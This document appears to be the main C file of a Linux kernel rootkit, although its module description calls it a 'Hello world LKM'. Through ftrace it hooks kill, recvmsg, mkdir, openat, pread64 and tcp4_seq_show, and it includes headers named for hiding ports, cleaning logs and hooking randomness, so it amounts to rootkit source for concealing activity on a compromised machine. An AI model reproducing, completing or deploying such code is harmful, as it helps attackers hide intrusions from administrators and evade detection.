#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include "ftrace_helper.h"
#include "hook_random.h"
#include "hook_kill.h"
#include "hide_port.h"
#include "log_clean.h"

///< The license type -- this affects runtime behavior 
MODULE_LICENSE("GPL");

///< The author -- visible when you use modinfo 
MODULE_AUTHOR("ucasqsl");

///< The description -- see modinfo 
MODULE_DESCRIPTION("A simple Hello world LKM!");

///< The version of the module 
MODULE_VERSION("0.1");
//
//static asmlinkage long (*orig_kill)(const struct pt_regs *);
static struct ftrace_hook hooks[] = {
        HOOK_SYS("sys_kill", hook_kill, &orig_kill),
        HOOK_SYS("sys_recvmsg", fake_sys_recvmsg, &real_sys_recvmsg),
        HOOK_SYS("sys_mkdir", hook_mkdir, &orig_mkdir),
        HOOK_SYS("sys_openat", hook_openat, &orig_openat),
        HOOK_SYS("sys_pread64", hook_read, &orig_read),
        HOOK("tcp4_seq_show", fake_tcp4_seq_show, &orig_tcp4_seq_show),
};

/* init and exit functions where the hooking will happen later */
static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err) {
        printk(KERN_INFO "rootkit: failed to install hooks");
        return err;
    }


    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

